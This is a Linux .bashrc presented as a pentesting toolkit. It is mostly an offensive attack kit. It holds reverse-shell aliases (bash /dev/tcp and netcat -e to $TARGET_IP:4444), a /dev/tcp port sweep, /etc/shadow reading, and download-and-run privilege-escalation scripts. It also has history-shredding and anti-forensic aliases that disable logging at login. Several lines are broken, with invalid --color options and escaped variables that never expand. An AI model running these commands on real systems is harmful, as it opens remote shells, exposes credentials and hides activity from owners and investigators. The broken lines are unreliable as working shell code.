# ===========================
# Ultimate Pentesting .bashrc
# ===========================

# --------- Preserve & Disable History for OpSec ---------
HIST_BACKUP=~/.bash_history_$(date +"%Y%m%d%H%M%S").bak
cp ~/.bash_history "$HIST_BACKUP" 2>/dev/null   # Backup history before wiping

export HISTFILE=/dev/null   # Disable history file
unset HISTFILE
export HISTSIZE=0
export HISTCONTROL=ignoredups:erasedups
shopt -u histappend  # Disable appending to history

# Alias to restore history (use only if needed)
alias restorehistory="mv $HIST_BACKUP ~/.bash_history && export HISTFILE=~/.bash_history && shopt -s histappend"

# --------- Colorization Enhancements ---------
export LS_OPTIONS='--color=auto'
eval "$(dircolors)"

alias ls='ls $LS_OPTIONS'
alias lsa='ls -alF --color=auto'
alias ll='ls -alh --color=auto'
alias la='ls -A --color=auto'
alias ld='ls -d */ --color=auto'
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'

# Colorized netsec commands
alias netstat='netstat -tulnp --color=auto'
alias ss='ss -tulnp --color=auto'
alias dmesg='dmesg --color=auto'
alias whois='whois --color=auto'
alias nslookup='nslookup --color=auto'
alias curl='curl -s --stderr - --color=auto'
alias ps='ps aux --sort=-%mem --color=auto'
alias top="top -c --sort=cpu --color=auto"

# Colorized file hunting
alias findexec="find / -type f -executable -exec ls -alF --color=auto {} + 2>/dev/null"
alias findsuid="find / -type f -perm -4000 -exec ls -alF --color=auto {} + 2>/dev/null"

# Colorized log reading
alias tailf='tail -f --color=auto'
alias head='head --color=auto'

# --------- Custom Prompt (Useful & Stealthy) ---------
export PS1="\[\033[01;32m\]\u\[\033[00m\]@\[\033[01;34m\]\h\[\033[00m\]:\[\033[01;33m\]\w\[\033[00m\]\$ "

# --------- Fix Common Pentesting Mistakes ---------
alias sl='ls'
alias cd..='cd ..'
alias gerp='grep'
alias mroe='more'
alias klaer='clear'
alias quit='exit'
alias vi='vim'
alias shh='ssh'
alias tnamp='nmap'
alias ehtool='ethtool'
alias htop='htop'

# --------- Pentesting Aliases ---------
alias revbash="bash -i >& /dev/tcp/\$TARGET_IP/4444 0>&1"
alias revnc="nc -e /bin/sh \$TARGET_IP 4444"
alias sshenum="for i in {1..65535}; do (echo > /dev/tcp/\$TARGET_IP/\$i) 2>/dev/null && echo 'Port \$i - Open'; done"
alias enumusers="cat /etc/passwd"
alias enumgroups="cat /etc/group"
alias enumshadow="sudo cat /etc/shadow"
alias findsuid="find / -type f -perm -4000"
alias findconf="find / -type f -name '*.conf' 2>/dev/null"
alias findcron="cat /etc/crontab; ls -lah /etc/cron*"
alias linpeas="wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
alias linuxpriv="wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh"

# --------- Windows-Specific Recon from Linux ---------
alias smbcheck="smbclient -L //\$TARGET_IP -U ''"
alias enumshares="crackmapexec smb \$TARGET_IP -u '' -p '' --shares"
alias enumuserswin="crackmapexec smb \$TARGET_IP -u '' -p '' --users"
alias enumdisks="wmic logicaldisk get caption,description,filesystem,freespace,size,volumename"

# --------- Stealth & Cleanup Aliases ---------
alias historywipe='cat /dev/null > ~/.bash_history && history -c'
alias vanish='shred -u ~/.bash_history; unset HISTFILE; export HISTSIZE=0'
alias cloak="unset HISTFILE; export HISTSIZE=0; export HISTFILESIZE=0; history -c"
alias uncloak="export HISTFILE=~/.bash_history; export HISTSIZE=5000; export HISTFILESIZE=10000; shopt -s histappend"

# --------- Environment & Editor ---------
export VISUAL=nano
export EDITOR=nano
export PATH=$PATH:$HOME/bin

# --------- Auto-Enable Useful Tools ---------
if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# ===========================
# Quick Local Network Scanner
# ===========================

# Function: Ping sweep the local subnet
local_scan() {
    local subnet=$(ip -4 route | grep default | awk '{print $3}' | cut -d'.' -f1-3)
    echo "Scanning subnet: \$subnet.0/24"
    
    for ip in {1..254}; do
        ping -c 1 -W 1 "\$subnet.\$ip" &>/dev/null && echo "[+] Host UP: \$subnet.\$ip" &
    done
    wait
}

# Function: List active network connections
list_active() {
    echo "[*] Active network connections:"
    netstat -tulnp | grep LISTEN
}

# Function: Show local ARP cache
arp_scan() {
    echo "[*] ARP table (Local Network Devices):"
    arp -a
}

# Function: Check for packet capture capabilities
pcap_check() {
    if command -v tcpdump &> /dev/null; then
        echo "[+] tcpdump is available"
    else
        echo "[-] tcpdump NOT found"
    fi
    
    if command -v tshark &> /dev/null; then
        echo "[+] tshark is available"
    else
        echo "[-] tshark NOT found"
    fi
}

# Function: Quick network scan (combines all)
quicknet() {
    echo "========================="
    echo " Quick Network Scan "
    echo "========================="
    
    local_scan
    list_active
    arp_scan
    pcap_check
}

# Alias to run full network check
alias scanlocal="quicknet"

# --------- Pentesting Function with Target IP ---------
quickscan() {
    nmap -sC -sV -T4 -p- "\$1"
}

# Usage: quickscan 192.168.1.1
